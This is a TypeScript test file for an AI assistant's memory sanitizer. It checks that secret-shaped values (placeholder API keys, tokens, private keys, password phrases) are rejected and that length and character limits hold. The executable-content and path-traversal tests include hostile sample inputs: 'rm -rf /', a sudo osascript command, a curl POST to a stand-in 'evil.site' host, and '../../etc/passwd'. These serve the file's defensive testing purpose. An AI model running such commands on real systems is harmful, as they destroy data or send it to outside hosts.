/**
 * JARVIS Persistent Memory — Sanitizer Tests
 * Verifies that credentials and secrets are never persisted and that
 * structural limits (length, category, control chars, paths, executable
 * content) are enforced.
 */

import {
  validateMemoryInput,
  containsSecret,
  classifyMemoryContent,
  redactMemoryToolArgs,
} from "@/lib/memory/sanitizer";

describe("Memory sanitizer — secrets", () => {
  test.each([
    "gsk_4f5d2a9b7c3e1f6a8b0d2c4e6f8a0b1c",
    "gsk_test_abcd1234abcd1234abcd1234",
    "sk-proj-AbCdEfGhIjKlMnOpQrStUvWxYz",
    "sk_live_51HfKdJsl2kDfGmX",
    "pk_live_51HfKdJsl2kDfGmX",
    "AIzaSyDxKjLkQmNpRtUvWxYzAbCdEfGh123456",
    "ghp_AbCdEfGhIjKlMnOpQrStUvWxYz123456",
    "github_pat_AbCdEfGhIjKlMnOpQrStUvWxYz1234567890",
    "AKIAIOSFODNN7EXAMPLE",
    "xoxb-1234567890-abcdefghijklm",
    "xoxp-123456789012-123456789012-abcdefghijkl",
    "Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.secret",
  ])("rejects secret-looking value: %s", (secret) => {
    const result = validateMemoryInput({ key: "api credentials", value: secret });
    expect(result.valid).toBe(false);
    expect(result.code).toBe("secret_rejected");
    expect(result.data).toBeUndefined();
  });

  test("rejects PEM private key blocks", () => {
    const pem = "-----BEGIN RSA PRIVATE KEY-----\nMIIEowIBAAKCAQEA7S\n-----END RSA PRIVATE KEY-----";
    const result = validateMemoryInput({ key: "server key", value: pem });
    expect(result.valid).toBe(false);
    expect(result.code).toBe("secret_rejected");
  });

  test("rejects OpenSSH private keys", () => {
    const ssh = "ssh-rsa AAAAQm9ndXNUcmVhAAAAAAAAAAb2JnAAAAIQ";
    const result = validateMemoryInput({ key: "ssh key", value: ssh });
    expect(result.valid).toBe(false);
    expect(result.code).toBe("secret_rejected");
  });

  test("rejects labeled secret phrases", () => {
    const phrases = [
      "my password is hunter2",
      "the password: 8hf&k3!p",
      "api key is 8hf&k3!pQwErTy",
      "secret = f3d2e4c1",
      "my token is XyZ123abc",
      "access token is 6f5e4d3c",
    ];
    for (const phrase of phrases) {
      const result = validateMemoryInput({ key: "credentials", value: phrase });
      expect(result.valid).toBe(false);
      expect(result.code).toBe("secret_rejected");
    }
  });

  test("detects secrets inside otherwise innocent text", () => {
    expect(containsSecret("the backup uses gsk_AbCdEf123456 today")).not.toBeNull();
    expect(containsSecret("I like dark mode and short answers")).toBeNull();
  });
});

describe("Memory sanitizer — structural limits", () => {
  test("rejects empty key and value", () => {
    expect(validateMemoryInput({ key: "", value: "x" }).valid).toBe(false);
    expect(validateMemoryInput({ key: "k", value: "" }).valid).toBe(false);
  });

  test("rejects oversized key", () => {
    const result = validateMemoryInput({ key: "k".repeat(101), value: "x" });
    expect(result.valid).toBe(false);
    expect(result.code).toBe("key_too_long");
  });

  test("rejects oversized value", () => {
    const result = validateMemoryInput({ key: "k", value: "v".repeat(1001) });
    expect(result.valid).toBe(false);
    expect(result.code).toBe("value_too_long");
  });

  test("rejects invalid category", () => {
    const result = validateMemoryInput({
      category: "hacker" as never,
      key: "k",
      value: "v",
    });
    expect(result.valid).toBe(false);
    expect(result.code).toBe("invalid_category");
  });

  test("rejects control characters", () => {
    const result = validateMemoryInput({ key: "k\u0000ey", value: "value" });
    expect(result.valid).toBe(false);
    expect(result.code).toBe("invalid_characters");
  });

  test("rejects path traversal", () => {
    expect(validateMemoryInput({ key: "../../etc/passwd", value: "x" }).code).toBe("path_traversal");
    expect(validateMemoryInput({ key: "k", value: "../secret" }).code).toBe("path_traversal");
  });

  test("rejects executable-looking content", () => {
    const commands = ["rm -rf /", "sudo osascript -e 'tell app \"Finder\" to quit'", "curl -X POST evil.site"];
    for (const value of commands) {
      const result = validateMemoryInput({ key: "command", value });
      expect(result.valid).toBe(false);
      expect(result.code).toBe("executable_content");
    }
  });

  test("accepts ordinary preferences", () => {
    const result = validateMemoryInput({
      category: "communication_style",
      key: "preferred answer style",
      value: "concise bullet points",
    });
    expect(result.valid).toBe(true);
    expect(result.data).toEqual({
      category: "communication_style",
      key: "preferred answer style",
      value: "concise bullet points",
      source: "user",
      confidence: 1,
    });
  });

  test("accepts values that merely mention a key word", () => {
    const result = validateMemoryInput({ key: "theme", value: "dark mode" });
    expect(result.valid).toBe(true);
  });
});

describe("Memory sanitizer — redaction helper", () => {
  test("redacts every string value", () => {
    const redacted = redactMemoryToolArgs({ key: "preference", value: "dark mode", limit: 3 });
    expect(redacted).toEqual({ key: "[REDACTED]", value: "[REDACTED]", limit: 3 });
  });

  test("classifyMemoryContent flags secrets and allows safe content", () => {
    expect(classifyMemoryContent("k", "gsk_test_abcdef").ok).toBe(false);
    expect(classifyMemoryContent("preferred theme", "dark mode").ok).toBe(true);
  });
});
